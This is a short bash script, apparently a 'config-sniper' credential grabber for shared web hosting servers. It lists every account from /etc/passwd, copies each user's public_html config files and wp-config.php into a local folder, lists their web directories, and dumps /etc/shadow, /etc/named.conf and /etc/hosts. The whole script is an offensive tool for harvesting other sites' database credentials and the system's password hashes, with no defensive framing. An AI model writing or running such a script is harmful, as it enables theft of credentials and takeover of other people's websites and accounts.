#!/bin/bash

awk -F':' '{ print $1 }' /etc/passwd  > passwd.txt
passwd=`cat passwd.txt`
mkdir config-sniper
pwd=`pwd`
wait
for i in $passwd
do

cp /home/$i/public_html/*config.*  $pwd/config-sniper/$i.txt
cp /home/$i/public_html/wp-config.php  $pwd/config-sniper/$i.txt
ls -la /home/$i/public_html/
cat /etc/named.conf > named.txt
cat /etc/shadow > shadow.txt
cat /etc/hosts > hosts.txt

done
